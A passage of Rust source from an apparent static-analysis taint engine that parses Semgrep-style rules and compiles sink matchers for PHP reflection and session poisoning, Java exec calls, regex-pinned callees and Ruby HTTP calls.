            let next = if i + 1 < bytes.len() {
                bytes[i + 1]
            } else {
                b' '
            };
            if prev != b'=' && prev != b'<' && prev != b'>' && prev != b'!' && next != b'=' {
                eq = Some(i);
                break;
            }
        }
    }
    let eq = eq?;
    let lhs = line[..eq].trim();
    let rhs = line[eq + 1..].trim().trim_end_matches(';').trim();
    let tokens: Vec<&str> = lhs.split_whitespace().collect();
    if tokens.len() < 2 {
        return None;
    }
    let var = *tokens.last()?;
    if !is_metavariable(var) || rhs.is_empty() {
        return None;
    }
    Some((var.to_string(), rhs.to_string()))
}

/// Parse an initializer call `Receiver.method("literal")`, returning the
/// receiver's final `.`-segment, the method name, and the first string-literal
/// argument (quotes stripped). Returns `None` when the callee is not a dotted
/// `Receiver.method` of plain identifiers or the first argument is not a string
/// literal.
fn parse_init_call(init: &str) -> Option<(String, String, String)> {
    let c = init.trim();
    let open = c.find('(')?;
    if !c.ends_with(')') {
        return None;
    }
    let callee = c[..open].trim();
    let (recv, method) = callee.rsplit_once('.')?;
    let recv_seg = recv.rsplit('.').next()?.trim();
    let method = method.trim();
    if !is_identifier(recv_seg) || !is_identifier(method) {
        return None;
    }
    let args = &c[open + 1..c.len() - 1];
    let first = split_top_level_commas(args).into_iter().next()?;
    let first = first.trim();
    let inner = first.strip_prefix('"').and_then(|t| t.strip_suffix('"'))?;
    if inner.is_empty() {
        return None;
    }
    Some((recv_seg.to_string(), method.to_string(), inner.to_string()))
}

/// Parse a `$MV.method(...)` call, returning the receiver metavariable and the
/// method name when the receiver is a bare metavariable and the method is a
/// single plain identifier. Returns `None` otherwise.
fn parse_receiver_method_call(pat: &str) -> Option<(String, String)> {
    let c = pat.trim().trim_end_matches(';').trim();
    let open = c.find('(')?;
    let callee = c[..open].trim();
    let (recv, method) = callee.split_once('.')?;
    if is_metavariable(recv) && !method.contains('.') && is_identifier(method) {
        Some((recv.to_string(), method.to_string()))
    } else {
        None
    }
}

/// The PHP superglobals. When the base of a `$SUPER[$KEY] = …` assignment is one
/// of these, the base is a CONCRETE variable (not a metavariable), so the
/// subscript-key sink is bounded to writes into that superglobal.
const PHP_SUPERGLOBALS: &[&str] = &[
    "_GET", "_POST", "_REQUEST", "_COOKIE", "_SESSION", "_SERVER", "_ENV", "_FILES", "GLOBALS",
];

/// Return the stripped name (`_SESSION`) if `s` is a PHP superglobal token
/// (`$_SESSION`, …). Superglobals are lexically indistinguishable from
/// metavariables (`is_metavariable("$_SESSION")` is true), so the concrete
/// superglobal set is what tells a real superglobal base apart from a rule
/// metavariable key.
fn php_superglobal_name(s: &str) -> Option<&'static str> {
    let stripped = s.strip_prefix('$')?;
    PHP_SUPERGLOBALS.iter().copied().find(|g| *g == stripped)
}

/// Parse a `new $MV(...)` object-creation pattern, returning the class-name
/// metavariable (`$MV`) when the class name is a bare metavariable. Returns
/// `None` for a concrete class name (`new SafeClass(...)`) — that is not a
/// tainted-class-name shape.
fn parse_new_metavar_classname(pat: &str) -> Option<String> {
    let p = pat.trim().trim_end_matches(';').trim();
    let rest = p.strip_prefix("new ")?.trim_start();
    let open = rest.find('(')?;
    if !rest.ends_with(')') {
        return None;
    }
    let name = rest[..open].trim();
    if is_metavariable(name) {
        Some(name.to_string())
    } else {
        None
    }
}

/// Compile the `tainted-object-instantiation` sink shape (PHP unsafe
/// reflection):
///
/// ```yaml
/// patterns:
///   - pattern-either:
///       - pattern-inside: new $SINK(...)
///   - pattern: $SINK
/// ```
///
/// Recognized when the block pairs a `pattern-inside: new $MV(...)` class-name
/// context with a focus/bare `pattern: $MV` (or `focus-metavariable: $MV`)
/// naming that SAME class-name metavariable. Compiles to a single
/// [`GenericMatcher::TaintedCallee`]. Returns `false` (claiming nothing) when
/// the focused metavariable is NOT the class name — e.g. a constructor-argument
/// focus `new C($ARG)` + `pattern: $ARG` — so the ordinary argument-sink path
/// keeps ownership and the class-name matcher never over-claims an argument
/// sink.
fn try_compile_tainted_callee_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut seeds: Vec<String> = Vec::new();
    let mut classname_mvs: Vec<String> = Vec::new();
    collect_tainted_callee_parts(items, &mut seeds, &mut classname_mvs);

    // The focused/bare metavariable must be exactly the class-name metavariable
    // of a `new $MV(...)` context — never a constructor argument.
    if !classname_mvs
        .iter()
        .any(|mv| seeds.iter().any(|seed| seed == mv))
    {
        return false;
    }
    out.push(GenericMatcher::TaintedCallee {
        description: describe("new $SINK(...)", role),
    });
    true
}

/// Walk a sink `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting focused metavariables (`focus-metavariable: $F` / bare
/// `pattern: $F`) and the class-name metavariables of any `new $MV(...)`
/// `pattern-inside`/`pattern` context.
fn collect_tainted_callee_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    classname_mvs: &mut Vec<String>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if let Some(mv) = parse_new_metavar_classname(t) {
                            classname_mvs.push(mv);
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        if let Some(mv) = parse_new_metavar_classname(s.trim()) {
                            classname_mvs.push(mv);
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_tainted_callee_parts(seq, seeds, classname_mvs);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Parse a `$BASE[$KEY] = $VAL` assignment-LHS-subscript pattern, returning
/// `(base, key_mv, val_mv)` where `base` is `Some(name)` for a concrete
/// superglobal target (`$_SESSION` → `_SESSION`) or `None` for a metavariable
/// base. Both `$KEY` and `$VAL` must be metavariables (and not superglobals).
/// Returns `None` for anything that is not a single subscript-target assignment
/// whose key and value are metavariables.
fn parse_subscript_key_assignment(pat: &str) -> Option<(Option<String>, String, String)> {
    let p = pat.trim().trim_end_matches(';').trim();
    // Locate the single top-level assignment `=` (not `==`/`!=`/`<=`/`>=`/`=>`).
    let bytes = p.as_bytes();
    let mut depth = 0i32;
    let mut eq_idx = None;
    for (i, &b) in bytes.iter().enumerate() {
        match b {
            b'[' | b'(' => depth += 1,
            b']' | b')' => depth -= 1,
            b'=' if depth == 0 => {
                let next = bytes.get(i + 1).copied();
                let prev = i.checked_sub(1).map(|j| bytes[j]);
                if next != Some(b'=')
                    && next != Some(b'>')
                    && !matches!(prev, Some(b'=') | Some(b'!') | Some(b'<') | Some(b'>'))
                {
                    eq_idx = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let eq = eq_idx?;
    let lhs = p[..eq].trim();
    let rhs = p[eq + 1..].trim();
    // The assigned value must be a bare metavariable (`$VAL`).
    if !is_metavariable(rhs) || php_superglobal_name(rhs).is_some() {
        return None;
    }
    // The LHS must be a single `BASE[KEY]` subscript.
    if !lhs.ends_with(']') {
        return None;
    }
    let open = lhs.find('[')?;
    let base = lhs[..open].trim();
    let key = lhs[open + 1..lhs.len() - 1].trim();
    // The key must be a metavariable (and not itself a superglobal).
    if !is_metavariable(key) || php_superglobal_name(key).is_some() {
        return None;
    }
    // The base is either a concrete superglobal or a metavariable (any base).
    let base_opt = if let Some(sg) = php_superglobal_name(base) {
        Some(sg.to_string())
    } else if is_metavariable(base) {
        None
    } else {
        return None;
    };
    Some((base_opt, key.to_string(), rhs.to_string()))
}

/// Compile the `tainted-session` sink shape (PHP session poisoning):
///
/// ```yaml
/// patterns:
///   - pattern-inside: $_SESSION[$KEY] = $VAL;
///   - pattern: $KEY
/// ```
///
/// Recognized when the block pairs a `pattern-inside: $BASE[$KEY] = $VAL;`
/// assignment-target context with a focus/bare `pattern: $KEY` naming the KEY
/// metavariable. Compiles to a single [`GenericMatcher::TaintedSubscriptKey`]
/// carrying the superglobal base. Returns `false` (claiming nothing) when the
/// focused metavariable is the assigned VALUE `$VAL` rather than the KEY — so a
/// tainted-value sink is never mistaken for a tainted-key sink.
fn try_compile_subscript_key_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut seeds: Vec<String> = Vec::new();
    let mut targets: Vec<(Option<String>, String, String)> = Vec::new();
    collect_subscript_key_parts(items, &mut seeds, &mut targets);

    // The focused/bare metavariable must be exactly the KEY of a
    // `$BASE[$KEY] = $VAL` context — never the assigned value `$VAL`.
    let hit = targets
        .iter()
        .find(|(_, key, _)| seeds.iter().any(|seed| seed == key));
    let Some((base, _, _)) = hit else {
        return false;
    };
    out.push(GenericMatcher::TaintedSubscriptKey {
        base: base.clone(),
        description: describe("$_SESSION[$KEY] = ...", role),
    });
    true
}

/// Walk a sink `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting focused metavariables and the `(base, key, val)` triples of any
/// `$BASE[$KEY] = $VAL` `pattern-inside`/`pattern` assignment context.
fn collect_subscript_key_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    targets: &mut Vec<(Option<String>, String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if let Some(triple) = parse_subscript_key_assignment(t) {
                            targets.push(triple);
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        if let Some(triple) = parse_subscript_key_assignment(s.trim()) {
                            targets.push(triple);
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_subscript_key_parts(seq, seeds, targets);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Normalize a leading Semgrep typed-receiver cast `(Type $RECV).…` to a bare
/// metavariable receiver `$RECV.…`, so a call whose receiver is a typed
/// metavariable — e.g. the statement sink
/// `(java.lang.Runtime $R).exec($CMD, $ENV_ARGS, ...);` — reads as an ordinary
/// `$R.exec(...)` call context. Returns the input trimmed and unchanged when it
/// is not a `(Type $MV)` group followed by a single trailing call (a bare
/// `(Type $MV)` typed-metavariable, or a chained receiver, is left alone so the
/// typed-source recognizer keeps ownership and no INNER call is mistaken for
/// the sink call).
fn strip_typed_receiver(call: &str) -> String {
    let c = call.trim();
    if c.starts_with('(') {
        if let Some((_, metavar, remainder)) = parse_typed_metavar(c) {
            let remainder = remainder.trim();
            if !remainder.is_empty() {
                let normalized = format!("{metavar}{remainder}");
                // Only rewrite when the result is a SINGLE call whose argument
                // list spans to the end (`$R.exec($CMD, $ENV_ARGS, ...);`). A
                // chained receiver (`$REQ.getSession().$FUNC(...)`) is left
                // un-normalized so the focus-call recognizer never mistakes the
                // INNER call (`getSession`) for the sink call — those chained
                // shapes remain (faithfully) unsupported.
                if is_single_trailing_call(&normalized) {
                    return normalized;
                }
            }
        }
    }
    c.to_string()
}

/// True when `pat` (a `;`-terminated statement or expression) is a single call
/// `callee(args)` whose FIRST `(` argument list closes at the very end — i.e.
/// there is no trailing chained call. `$R.exec($X, ...)` is single; the chained
/// `$REQ.getSession().$FUNC($X)` is not (its first `(` closes early).
fn is_single_trailing_call(pat: &str) -> bool {
    let p = pat.trim().trim_end_matches(';').trim();
    let Some(open) = p.find('(') else {
        return false;
    };
    let bytes = p.as_bytes();
    let mut depth = 0i32;
    for (i, &b) in bytes.iter().enumerate().skip(open) {
        match b {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return i == p.len() - 1;
                }
            }
            _ => {}
        }
    }
    false
}

/// Walk a sink `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting focused metavariables (`focus-metavariable: $F` and bare
/// `pattern: $F`), call-context texts (`pattern:`/`pattern-inside:` whose value
/// is a call expression), and `metavariable-regex` (metavariable, regex) pairs.
fn collect_focus_call_sink_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    call_texts: &mut Vec<String>,
    metavar_regexes: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else {
                            // Normalize a leading typed-receiver cast
                            // `(java.lang.Runtime $R).exec(...)` to `$R.exec(...)`
                            // so a statement sink whose receiver is a typed
                            // metavariable reads as an ordinary call context.
                            let norm = strip_typed_receiver(t);
                            if is_call_context_pattern(&norm) {
                                call_texts.push(norm);
                            }
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        let norm = strip_typed_receiver(s.trim());
                        if is_call_context_pattern(&norm) {
                            call_texts.push(norm);
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(m) = val.as_mapping() {
                        let mv = m
                            .get(YamlValue::from("metavariable"))
                            .and_then(YamlValue::as_str);
                        let re = m.get(YamlValue::from("regex")).and_then(YamlValue::as_str);
                        if let (Some(mv), Some(re)) = (mv, re) {
                            metavar_regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_focus_call_sink_parts(seq, seeds, call_texts, metavar_regexes);
                    }
                }
                _ => {}
            }
        }
    }
}

/// True when `pat` looks like a (single) call expression: a callee followed by
/// a balanced `(...)` argument list, with the call ending the pattern (allowing
/// a trailing statement `;` / `,...` Semgrep ellipsis already inside the parens).
/// Rejects assignments, binops, blocks, and multi-line definitions.
fn is_call_context_pattern(pat: &str) -> bool {
    let p = pat.trim().trim_end_matches(';').trim();
    // A single logical line (no nested blocks / function bodies).
    if p.contains('\n') || p.contains('{') {
        return false;
    }
    // Must be a call: a `(` opening an argument list that closes at end.
    let Some(open) = p.find('(') else {
        return false;
    };
    if !p.ends_with(')') {
        return false;
    }
    let callee = p[..open].trim();
    if callee.is_empty() {
        return false;
    }
    // The callee must not itself contain call/operator punctuation that would
    // make this an expression rather than a plain `callee(args)` form. A dotted
    // / metavariable chain is fine.
    !callee.contains('(')
        && !callee.contains('=')
        && !callee.contains('+')
        && !callee.contains('%')
        && !callee.contains('[')
}

/// True when the call pattern `call` lists `seed` (a metavariable like `$ARG`)
/// inside its argument list, OR has a wildcard/metavariable argument list
/// (`(...)`, `($X)`) — i.e. the focused metavariable is one of the call's
/// arguments. Bounds the sink to a focus that is genuinely a call argument.
fn call_has_arg(call: &str, seed: &str) -> bool {
    let c = call.trim().trim_end_matches(';').trim();
    let Some(open) = c.find('(') else {
        return false;
    };
    let bytes = c.as_bytes();
    let mut depth = 0i32;
    let mut close = None;
    for (i, &b) in bytes.iter().enumerate().skip(open) {
        match b {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(close) = close else {
        return false;
    };
    let args = c[open + 1..close].trim();
    // Literal argument match (token boundary so `$ARG` != `$ARGUMENT`).
    let literal = args
        .split(|ch: char| !is_ident_char(ch) && ch != '$')
        .any(|tok| tok == seed);
    if literal {
        return true;
    }
    // A wildcard argument list (`...` / a bare metavariable) carries the focus.
    args == "..." || args.is_empty() || is_metavariable(args)
}

/// Compile the callee of a recognised focus-call sink to `Call`/`MethodName`
/// matcher(s), pinning a metavariable callee/method with its anchored-alternation
/// `metavariable-regex` where present.
fn compile_focus_call_callee(
    call: &str,
    role: MatcherRole,
    lang: Language,
    metavar_regexes: &[(String, String)],
    out: &mut Vec<GenericMatcher>,
) {
    let c = call.trim().trim_end_matches(';').trim();
    let Some(open) = c.find('(') else {
        return;
    };
    let callee = c[..open].trim();

    // Case 1: `$RECV.$METH(...)` — metavariable receiver + metavariable method.
    // Pin `$METH` via its regex → one `MethodName` per alternative.
    if let Some(dot) = callee.find('.') {
        let recv = &callee[..dot];
        let meth = &callee[dot + 1..];
        if is_metavariable(recv) && is_metavariable(meth) && !meth.contains('.') {
            if let Some(names) = regex_alternatives_for(meth, metavar_regexes) {
                for name in names {
                    out.push(GenericMatcher::MethodName {
                        method: name.clone(),
                        description: describe(&name, role),
                    });
                }
            }
            return;
        }
        // `$RECV.method(...)` — concrete method on a metavariable receiver.
        if is_metavariable(recv) && is_identifier(meth) {
            out.push(GenericMatcher::MethodName {
                method: meth.to_string(),
                description: describe(meth, role),
            });
            return;
        }
        // Deep field-access ellipsis chain `$OBJ. ... .$METHOD(...)` (Semgrep's
        // `. ... .` deep wildcard): the FINAL dotted segment is a metavariable
        // method, pinned by a `metavariable-regex`. The Go
        // `gorm-dangerous-method-usage` sink `$GORM. ... .$METHOD($VALUE)` uses
        // this form. The intervening chain is any receiver, so we enumerate the
        // anchored alternation of the method pin into one `MethodName` per
        // alternative (`Order`, `Exec`, `Raw`, …) — a method-name-bounded sink
        // that fires only for those method names with a tainted argument. An
        // unpinned final metavariable (no anchored-alternation regex) yields
        // nothing, staying FP-safe.
        if callee.contains("...") {
            let last = callee.rsplit('.').next().unwrap_or("").trim();
            if is_metavariable(last) {
                if let Some(names) = regex_alternatives_for(last, metavar_regexes) {
                    for name in names {
                        out.push(GenericMatcher::MethodName {
                            method: name.clone(),
                            description: describe(&name, role),
                        });
                    }
                }
                return;
            }
        }
    }

    // Case 2: `$FUNC(...)` — pure-metavariable callee. Pin via its regex → one
    // `Call` per alternative.
    if is_metavariable(callee) {
        if let Some(names) = regex_alternatives_for(callee, metavar_regexes) {
            for name in names {
                out.push(GenericMatcher::Call {
                    canonical: name.clone(),
                    description: describe(&name, role),
                });
            }
        }
        return;
    }

    // Case 3: concrete callee (`redirect_to`, `render`, `a.b.method`). Reuse the
    // normal pattern compiler on the call text so it lands in the right shape.
    if let Some(m) = compile_pattern(c, role, lang) {
        if matches!(
            m,
            GenericMatcher::Call { .. } | GenericMatcher::MethodName { .. }
        ) {
            out.push(m);
        }
    }
}

/// If `mv` is constrained by an anchored alternation `metavariable-regex`
/// (`^(a|b|c)$`, with optional `\b...\b` word-boundary wrapping), return the
/// alternative names. Only plain-identifier alternatives are accepted; any
/// non-anchored or non-trivial regex yields `None` (we will not invent names).
fn regex_alternatives_for(mv: &str, metavar_regexes: &[(String, String)]) -> Option<Vec<String>> {
    let (_, re) = metavar_regexes.iter().find(|(m, _)| m == mv)?;
    parse_anchored_alternation(re)
}

/// Parse `^(a|b|c)$` or `\b(a|b|c)\b` (or a single `^a$` / `\ba\b`) into its
/// plain-identifier alternatives. Returns `None` for anything else — we never
/// guess at a non-trivial regex.
fn parse_anchored_alternation(re: &str) -> Option<Vec<String>> {
    let mut body = re.trim();
    // Strip start/end anchors.
    body = body.strip_prefix('^').unwrap_or(body);
    body = body.strip_suffix('$').unwrap_or(body);
    // Strip `\b ... \b` word boundaries.
    body = body.strip_prefix("\\b").unwrap_or(body);
    body = body.strip_suffix("\\b").unwrap_or(body);
    // Strip a single wrapping group.
    if body.starts_with('(') && body.ends_with(')') {
        body = &body[1..body.len() - 1];
    }
    if body.is_empty() {
        return None;
    }
    let names: Vec<String> = body.split('|').map(|s| s.trim().to_string()).collect();
    if names.iter().all(|n| is_identifier(n)) {
        Some(names)
    } else {
        None
    }
}

/// A bare-metavariable callee shape extracted from a `pattern:` text, tagged
/// with the metavariable that a `metavariable-regex` may pin.
enum BareCallee {
    /// `$F(...)` — the whole callee is a metavariable. Compiles to `CallRegex`
    /// (the regex is tested against the full callee text).
    Callee(String),
    /// `$OBJ.$M(...)` — metavariable receiver, metavariable method. Compiles to
    /// `MethodNameRegex` (the regex is tested against the final method name).
    Method(String),
}

/// If `pat` is a call whose callee is a bare metavariable (`$F(...)`) or a
/// metavariable-receiver / metavariable-method (`$OBJ.$M(...)`), return the
/// constrainable metavariable tagged with its shape. Any concrete or partially
/// concrete callee returns `None` (handled by the normal pattern compiler).
fn bare_metavar_callee(pat: &str) -> Option<BareCallee> {
    let c = pat.trim().trim_end_matches(';').trim();
    // A leading Java typed-receiver cast `(Type $RECV).…` is a droppable
    // narrowing: normalize `(Statement $S).$SQLFUNC(...)` to `$S.$SQLFUNC(...)`
    // so the receiver reads as a bare metavariable and the method metavariable
    // can be pinned by its `metavariable-regex`. Without this the leading `(`
    // makes the callee parse as empty and the shape is missed (the whole
    // `formatted-sql-string` / `tainted-system-command` SQL/exec sink family).
    let normalized;
    let c = if c.starts_with('(') {
        match parse_typed_metavar(c) {
            Some((_, metavar, remainder)) if !remainder.trim().is_empty() => {
                normalized = format!("{metavar}{remainder}");
                normalized.as_str()
            }
            _ => c,
        }
    } else {
        c
    };
    let open = c.find('(')?;
    let callee = c[..open].trim();
    if let Some(dot) = callee.find('.') {
        let recv = &callee[..dot];
        let meth = &callee[dot + 1..];
        if is_metavariable(recv) && is_metavariable(meth) && !meth.contains('.') {
            return Some(BareCallee::Method(meth.to_string()));
        }
        return None;
    }
    if is_metavariable(callee) {
        return Some(BareCallee::Callee(callee.to_string()));
    }
    None
}

/// Collect, across a `patterns:` block (recursing into `pattern-either:`),
/// every bare-metavariable callee shape from `pattern:` texts and every
/// `metavariable-regex` (metavariable, regex) pin.
fn collect_regex_callee_parts(
    items: &[YamlValue],
    callees: &mut Vec<BareCallee>,
    pins: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (key, val) in map {
            match key.as_str() {
                Some("pattern") => {
                    if let Some(text) = val.as_str() {
                        if let Some(bc) = bare_metavar_callee(text) {
                            callees.push(bc);
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            pins.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    // Recurse into both `pattern-either` and nested `patterns:`
                    // AND-blocks so a `$OBJ.$M(...)` + `metavariable-regex` pair
                    // buried inside a nested `patterns:` (e.g.
                    // `tainted-system-command`'s `(Runtime $R).$EXEC(...)` block)
                    // is still recognised.
                    if let Some(seq) = val.as_sequence() {
                        collect_regex_callee_parts(seq, callees, pins);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Try to recognise the "regex-bounded bare-metavariable callee" SINK shape: a
/// `patterns:` AND-block pairing a bare-metavar callee pattern (`$F(...)` or
/// `$OBJ.$M(...)`) with a `metavariable-regex` that pins that metavariable.
///
/// On recognition, compiles a name-constrained [`GenericMatcher::CallRegex`]
/// (full-callee regex) or [`GenericMatcher::MethodNameRegex`] (method-name
/// regex) and returns `true`. The compiled regex is enforced at match time, so
/// the otherwise-universal bare-metavar callee becomes FP-safe (only callees
/// whose name matches the regex fire).
///
/// Returns `false` (pushing nothing) when no bare-metavar callee is pinned by a
/// `metavariable-regex` — preserving the existing refusal of an unpinned
/// bare-metavar callee. Only the Sink/Sanitizer roles call this.
/// Parse a Ruby call pattern `<callee>(...)` whose callee carries EXACTLY ONE
/// Semgrep metavariable segment and is otherwise a concrete constant / dotted /
/// scope path. Returns `(metavariable, prefix, suffix)` such that substituting a
/// concrete name `N` for the metavariable yields the canonical callee
/// `format!("{prefix}{N}{suffix}")`.
///
/// Examples:
///   `Net::HTTP.$X(...)`           → ("$X", "Net::HTTP.", "")
///   `Net::HTTP::$METHOD.new(...)` → ("$METHOD", "Net::HTTP::", ".new")
///
/// The prefix must end in `.` or `::` (so the metavariable is a method or
/// constant SEGMENT of a concrete receiver, never the whole callee — a bare
/// `$F(...)` is refused as over-broad). Prefix and suffix must be concrete
/// (only `[A-Za-z0-9_:.]`), so a second metavariable disqualifies the shape.
fn parse_single_metavar_callee(pat: &str) -> Option<(String, String, String)> {
    let c = pat.trim();
    let open = c.find('(')?;
    if !c.ends_with(')') {
        return None;
    }
    let callee = c[..open].trim();
    if callee.matches('$').count() != 1 {
        return None;
    }
    let dollar = callee.find('$')?;
    let after = &callee[dollar + 1..];
    let mv_len: usize = after
        .chars()
        .take_while(|ch| ch.is_ascii_uppercase() || ch.is_ascii_digit() || *ch == '_')
        .map(|ch| ch.len_utf8())
        .sum();
    if mv_len == 0 {
        return None;
    }
    let mv = format!("${}", &after[..mv_len]);
    if !is_metavariable(&mv) {
        return None;
    }
    let prefix = &callee[..dollar];
    let suffix = &after[mv_len..];
    if prefix.is_empty() || !(prefix.ends_with('.') || prefix.ends_with(':')) {
        return None;
    }
    let concrete = |seg: &str| {
        seg.chars()
            .all(|ch| ch.is_ascii_alphanumeric() || ch == '_' || ch == ':' || ch == '.')
    };
    if !concrete(prefix) || !concrete(suffix) {
        return None;
    }
    Some((mv, prefix.to_string(), suffix.to_string()))
}

/// Collect the literal identifier / constant alternatives enumerated under a
/// `metavariable-pattern` value, recursing through nested `patterns:` /
/// `pattern-either:` lists down to leaf `pattern:` scalars. Non-identifier
/// leaves are ignored (they are inexpressible; ignoring them under-approximates
/// but never over-matches).
fn collect_metavar_pattern_literals(node: &YamlValue, out: &mut Vec<String>) {
    if let Some(seq) = node.as_sequence() {
        for item in seq {
            collect_metavar_pattern_literals(item, out);
        }
        return;
    }
    if let Some(map) = node.as_mapping() {
        for (k, val) in map {
            match k.as_str() {
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let s = s.trim();
                        if is_identifier(s) {
                            out.push(s.to_string());
                        }
                    }
                }
                Some("patterns") | Some("pattern-either") => {
                    collect_metavar_pattern_literals(val, out);
                }
                _ => {}
            }
        }
    }
}

/// Try to recognise the Ruby "metavariable-pattern-enumerated call" SINK shape:
/// a `patterns:` AND-block pairing a call whose callee carries a single
/// metavariable segment (`Net::HTTP.$X(...)`, `Net::HTTP::$METHOD.new(...)`) with
/// a `metavariable-pattern` that ENUMERATES that metavariable into a fixed set of
/// literal method / constant names via a nested `pattern-either:` of `pattern:`
/// leaves.
///
/// On recognition, enumerates one concrete [`GenericMatcher::Call`] per listed
/// name (receiver AND method both fixed) and returns `true`. The exact-callee
/// `Call` sink matching in [`taint_engine::match_call_sink`] then fires only when
/// the resolved callee equals one enumerated name — strictly ≤ what Semgrep's
/// bounded `metavariable-pattern` alternation matches, never broader. This is the
/// sink shape used by `avoid-tainted-http-request`
/// (`Net::HTTP.$X(...)` / `Net::HTTP::$METHOD.new(...)`).
///
/// Returns `false` (pushing nothing) when there is no single-metavariable callee
/// paired with an enumerated `metavariable-pattern`, leaving the caller to fall
/// through to graceful degradation. Only the Sink/Sanitizer roles call this — a
/// call argument is a data-flow destination, not a taint origin.
fn try_compile_ruby_metavar_pattern_enum_call_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    // (metavariable, prefix, suffix) for each single-metavar callee pattern.
    let mut callees: Vec<(String, String, String)> = Vec::new();
    // (metavariable, enumerated names) for each metavariable-pattern.
    let mut enums: Vec<(String, Vec<String>)> = Vec::new();
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        if map.len() != 1 {
            continue;
        }
        let (k, val) = map.iter().next().expect("len == 1");
        match k.as_str() {
            Some("pattern") => {
                if let Some(s) = val.as_str() {
                    if let Some(parts) = parse_single_metavar_callee(s) {
                        callees.push(parts);
                    }
                }
            }
            Some("metavariable-pattern") => {
                if let Some(mm) = val.as_mapping() {
                    let mv = mm
                        .get(YamlValue::from("metavariable"))
                        .and_then(|x| x.as_str());
                    if let Some(mv) = mv {
                        let mut names = Vec::new();
                        for key in ["patterns", "pattern-either", "pattern"] {
                            if let Some(sub) = mm.get(YamlValue::from(key)) {
                                collect_metavar_pattern_literals(sub, &mut names);
                            }
                        }
                        if !names.is_empty() {
                            enums.push((mv.to_string(), names));
                        }
                    }
                }
            }
            _ => {}
        }
    }

    if callees.is_empty() || enums.is_empty() {
        return false;
    }

    let before = out.len();
    for (mv, prefix, suffix) in &callees {
        let Some((_, names)) = enums.iter().find(|(m, _)| m == mv) else {
            continue;
        };
        for name in names {
            if !is_identifier(name) {
                continue;
            }
            let canonical = format!("{prefix}{name}{suffix}");
            let dup = out
                .iter()
                .any(|m| matches!(m, GenericMatcher::Call { canonical: c, .. } if c == &canonical));
            if !dup {
                out.push(GenericMatcher::Call {
                    description: describe(&canonical, role),
                    canonical,
                });
            }
        }
    }

    out.len() > before
}

fn try_compile_regex_constrained_callee_block(
    v: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut callees: Vec<BareCallee> = Vec::new();
    let mut pins: Vec<(String, String)> = Vec::new();
    collect_regex_callee_parts(items, &mut callees, &mut pins);

    if callees.is_empty() || pins.is_empty() {
        return false;
    }

    let before = out.len();
    for callee in &callees {
        let (mv, is_method) = match callee {
            BareCallee::Callee(mv) => (mv, false),
            BareCallee::Method(mv) => (mv, true),
        };
